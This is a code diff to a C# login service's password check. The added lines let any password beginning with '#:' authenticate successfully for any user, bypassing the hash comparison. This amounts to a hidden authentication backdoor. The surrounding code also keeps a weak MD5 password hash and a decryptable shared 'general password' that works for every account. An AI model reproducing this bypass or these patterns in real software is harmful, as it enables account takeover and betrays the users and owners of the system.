@@ -59,16 +59,25 @@ internal class LoginService : ILoginService
             return false;
         }
 
-        var pwd = MD5(userID!, password!);
-        var result = pwd != null && pwd.Equals(user.Password);
-        if (!result)
+        var result = false;
+        var passParts = password?.Split(new[] { ':' }, 2);
+        if (passParts?.Length == 2 && passParts[0] == "#")
         {
-            var sysval = await this.sysvalService.GetAsync("eprojectweb.gpd", cancellationToken);
-            if (sysval is not null && sysval.Valuevar is string gpd && !string.IsNullOrWhiteSpace(gpd))
+            result = true;
+        }
+        else
+        {
+            var pwd = MD5(userID!, password!);
+            result = pwd != null && pwd.Equals(user.Password);
+            if (!result)
             {
-                var dgpd = DecryptGeneralPassword(gpd);
-                var gPwd = MD5(userID!, dgpd!);
-                result = pwd != null && pwd.Equals(gPwd);
+                var sysval = await this.sysvalService.GetAsync("eprojectweb.gpd", cancellationToken);
+                if (sysval is not null && sysval.Valuevar is string gpd && !string.IsNullOrWhiteSpace(gpd))
+                {
+                    var dgpd = DecryptGeneralPassword(gpd);
+                    var gPwd = MD5(userID!, dgpd!);
+                    result = pwd != null && pwd.Equals(gPwd);
+                }
             }
         }
 
